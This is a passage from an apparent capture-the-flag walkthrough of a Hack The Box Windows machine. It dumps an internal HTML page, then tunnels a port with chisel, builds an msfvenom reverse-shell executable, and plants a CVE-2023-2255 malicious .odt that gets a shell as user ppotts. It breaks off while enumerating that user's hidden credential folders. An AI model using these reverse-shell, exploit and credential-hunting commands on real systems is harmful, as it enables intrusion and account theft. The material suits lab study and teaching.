</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar-brand&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>Business<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>button <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar-toggler&#34;</span> type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;button&#34;</span> data<span style="color:#ff79c6">-</span>toggle<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;collapse&#34;</span> data<span style="color:#ff79c6">-</span>target<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#navbarNav&#34;</span> aria<span style="color:#ff79c6">-</span>controls<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbarNav&#34;</span> aria<span style="color:#ff79c6">-</span>expanded<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;false&#34;</span> aria<span style="color:#ff79c6">-</span>label<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Toggle navigation&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>span <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar-toggler-icon&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>span<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;collapse navbar-collapse&#34;</span> id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbarNav&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>ul <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar-nav ml-auto&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>li <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-item active&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-link&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>Home <span style="color:#ff79c6">&lt;</span>span <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sr-only&#34;</span><span style="color:#ff79c6">&gt;</span>(current)<span style="color:#ff79c6">&lt;/</span>span<span style="color:#ff79c6">&gt;&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;/</span>li<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>li <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-item&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-link&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;resume.php&#34;</span><span style="color:#ff79c6">&gt;</span>Submit Application<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;/</span>li<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>li <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-item&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-link&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>Services<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;/</span>li<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>li <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-item&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-link&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>About<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;/</span>li<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>ul<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>nav<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;hero-header&#34;</span> style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;background-image: url(&#39;img/business.jpg&#39;)&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;header&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>h1<span style="color:#ff79c6">&gt;</span>Holography Industries<span style="color:#ff79c6">&lt;/</span>h1<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>World leader <span style="color:#ff79c6">in</span> Holographic Technologies<span style="color:#ff79c6">&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span>main content<span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;container mb-4 mt-4&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;row&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-8 mb-3&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>h2<span style="color:#ff79c6">&gt;</span>About us<span style="color:#ff79c6">&lt;/</span>h2<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>hr<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>We are all incredibly passionated about holograms at Holography Industries<span style="color:#ff79c6">.</span> We strongly believe that we are contributing to a brighter future <span style="color:#ff79c6">for</span> humanity<span style="color:#ff79c6">.&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>Life<span style="color:#f1fa8c">&#39;s all about evolution : And we are doing just that.&lt;/p&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>a href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btn btn-primary&#34;</span><span style="color:#ff79c6">&gt;</span>Make a Phone call<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-4 align-items-center d-md-flex&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>img <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img-fluid&#34;</span> src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img/girl.jpg&#34;</span> alt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;lapi_girl&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;!--</span><span style="color:#bd93f9">3</span> cards<span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;container-fluid mb-4&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;row bg-light p-md-5&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-4 mb-3&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>img <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-img-top&#34;</span> src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img/1.jpg&#34;</span> alt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-body&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Know more about us<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>Our Offices are currently all located <span style="color:#ff79c6">in</span> New York<span style="color:#ff79c6">.</span> If you would like to work with us, pay us a visit<span style="color:#ff79c6">!&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-footer&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>button <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btn btn-primary&#34;</span><span style="color:#ff79c6">&gt;</span>Find out more<span style="color:#ff79c6">!&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-4 mb-3&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>img <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-img-top&#34;</span> src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img/2.jpg&#34;</span> alt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-body&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>What we <span style="color:#ff79c6">do</span>?<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>Just a bunch of passionate engineers trying to make the world a better place <span style="color:#ff79c6">for</span> everyone<span style="color:#ff79c6">!&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-footer&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>button <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btn btn-primary&#34;</span><span style="color:#ff79c6">&gt;</span>Find out more<span style="color:#ff79c6">!&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-4 mb-3&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>img <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-img-top&#34;</span> src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img/3.jpg&#34;</span> alt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-body&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Contact Us<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>You can either contact us by email <span style="color:#ff79c6">or</span> by phone<span style="color:#ff79c6">.</span> HolographyTech@HolographyTechnologies<span style="color:#ff79c6">.</span>htb <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">514</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000</span><span style="color:#ff79c6">&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-footer&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">100</span>  <span style="color:#bd93f9">5113</span>  <span style="color:#bd93f9">100</span>  <span style="color:#bd93f9">5113</span>    <span style="color:#bd93f9">0</span>     <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">1492</span>k      <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#bd93f9">1664</span>k
</span></span><span style="display:flex;"><span>utton <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btn btn-primary&#34;</span><span style="color:#ff79c6">&gt;</span>Find out more<span style="color:#ff79c6">!&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span>footer<span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;py-3 bg-light text-center&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>p <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;m-0&#34;</span><span style="color:#ff79c6">&gt;</span>Copyright By <span style="color:#ff79c6">&lt;</span>a href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>holographictech<span style="color:#ff79c6">.</span>htb<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">2030</span><span style="color:#ff79c6">&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span> Optional JavaScript <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span> jQuery first, then Popper<span style="color:#ff79c6">.</span>js, then Bootstrap JS <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>script src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://code.jquery.com/jquery-3.3.1.slim.min.js&#34;</span> integrity<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&#34;</span> crossorigin<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;anonymous&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>script<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>script src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js&#34;</span> integrity<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1&#34;</span> crossorigin<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;anonymous&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>script<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>script src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&#34;</span> integrity<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&#34;</span> crossorigin<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;anonymous&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>script<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/</span>body<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>html<span style="color:#ff79c6">&gt;</span>
</span></span></code></pre></div><p>Let&rsquo;s use <code>chisel</code> and forward the port and connect to it.</p>
<p><code>Attacker Machine</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>chisel server -p 4444 --reverse
</span></span></code></pre></div><p><code>Victim Machine</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>chisel client 10.10.16.59:4444 R:8083:127.0.0.1:8083
</span></span></code></pre></div><p>Here&rsquo;s the http service.</p>
<p><img src="images/http-service.png" alt="alt text"></p>
<p>And here&rsquo;s the <code>resume.php</code>.</p>
<p><img src="images/resume.png" alt="alt text"></p>
<p>Privilege Escalation to <code>ppots</code> via <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-2255">CVE-2023-2255</a></p>
<h3 id="cve-2023-2255"><strong>CVE-2023-2255</strong></h3>
<p>After doing a research I realized this exploit was exactly what I was looking for.</p>
<p>I create a shell.exe file to get a reverse shell via msfvenom:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>  msfvenom <span style="color:#ff79c6">-</span>p windows<span style="color:#ff79c6">/</span>shell_reverse_tcp LHOST<span style="color:#ff79c6">=</span>tun0 LPORT<span style="color:#ff79c6">=</span><span style="color:#bd93f9">9001</span> <span style="color:#ff79c6">-</span>f exe <span style="color:#ff79c6">-</span>o shell<span style="color:#ff79c6">.</span>exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [<span style="color:#ff79c6">-</span>] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [<span style="color:#ff79c6">-</span>] No arch selected, selecting arch: x86 from the payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  No encoder specified, outputting raw payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Payload size: <span style="color:#bd93f9">324</span> bytes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Final size of exe file: <span style="color:#bd93f9">73802</span> bytes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Saved as: shell<span style="color:#ff79c6">.</span>exe
</span></span></code></pre></div><p>I create the exploit.odt file and transfer it to the following directory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  python3 CVE-2023-2255.py --cmd &#39;C:\programdata\shell.exe&#39; --output &#39;exploit.odt&#39;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  File exploit.odt has been created !
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  C:\xampp\htdocs\internal\applications\exploit.odt
</span></span></code></pre></div><p>After waiting few seconds I get reverse shell as PPotts user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  rlwrap nc -lvnp 9001
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  listening on [any] 9001 ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  connect to [10.10.15.29] from (UNKNOWN) [10.10.11.3] 53622
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Microsoft Windows [Version 10.0.20348.2322]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  (c) Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  C:\Program Files\LibreOffice 5\program&gt;whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  office\ppotts
</span></span></code></pre></div><h3 id="shell-as-hhogan-using-mimikatz"><strong>Shell as HHogan</strong> using <em>mimikatz</em></h3>
<p>Enumerate the credentials folders:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  PS C:\Users\PPotts\AppData\Roaming\Microsoft\credentials&gt; Get-ChildItem -Hidden C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials\
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
